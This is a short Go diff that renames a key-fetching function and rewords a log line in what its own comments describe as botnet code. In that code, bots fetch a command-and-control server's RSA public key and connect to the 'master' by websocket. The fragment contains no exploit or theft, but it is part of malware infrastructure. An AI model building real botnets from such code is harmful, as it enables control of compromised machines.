@@ -34,7 +34,7 @@ const (
 	maxMessageSize = 512                 // Maximum message size allowed from peer
 )
 
-func getCCPubKey(ccAddr string) (*rsa.PublicKey, string, error) {
+func getCmdAndCtrlPublicKey(ccAddr string) (*rsa.PublicKey, string, error) {
 	req, err := http.NewRequest(http.MethodGet, fmt.Sprintf("http://%s%s", ccAddr, KeyEndpoint), nil)
 	if err != nil {
 		return nil, "", fmt.Errorf("get cc public key NewRequest failed with: %s", err)
@@ -91,11 +91,11 @@ func BotHandshake(conn *websocket.Conn, ccDecryptionKey *rsa.PrivateKey) (string
 // CCHandshake is performed by bots to join a master's botnet. It takes the address of
 // the C&C (Command and Control) server, the bots public key, and the
 func CCHandshake(masterAddr string, botPubKey string) (*websocket.Conn, *rsa.PublicKey, error) {
-	ccEncryptionKey, rawPEM, err := getCCPubKey(masterAddr)
+	ccEncryptionKey, rawPEM, err := getCmdAndCtrlPublicKey(masterAddr)
 	if err != nil {
 		return nil, nil, err
 	}
-	log.Printf("[bot] fetched master pub key: \n%s", rawPEM)
+	log.Printf("[bot] fetched command and control public key: \n%s", rawPEM)
 
 	url := fmt.Sprintf("ws://%s%s", masterAddr, CCEndpoint)
 	conn, _, err := websocket.DefaultDialer.Dial(url, nil)
